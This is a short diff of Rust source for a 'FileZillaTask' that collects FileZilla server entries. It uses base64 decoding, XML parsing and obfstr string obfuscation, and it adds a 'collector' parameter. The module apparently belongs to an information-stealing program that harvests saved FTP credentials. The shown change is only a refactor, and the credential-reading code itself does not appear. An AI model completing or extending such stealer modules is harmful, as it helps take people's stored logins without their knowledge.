@@ -1,21 +1,23 @@
 use alloc::borrow::ToOwned;
+use alloc::format;
 use alloc::string::{String, ToString};
 use alloc::vec::Vec;
-use alloc::format;
+use collector::atomic::AtomicCollector;
+use obfstr::obfstr as s;
 use tasks::Task;
+use utils::base64::base64_decode;
 use utils::path::{Path, WriteToFile};
 use windows::core::HSTRING;
 use windows::Data::Xml::Dom::XmlDocument;
-use utils::base64::base64_decode;
-use obfstr::obfstr as s;
 
 pub(super) struct FileZillaTask;
 
 impl Task for FileZillaTask {
-    unsafe fn run(&self, parent: &Path) {
+    // TODO: Impl collector
+    unsafe fn run(&self, parent: &Path, _: &AtomicCollector) {
         let servers = collect_servers();
 
-        if servers.len() == 0 {
+        if servers.is_empty() {
             return;
         }
 
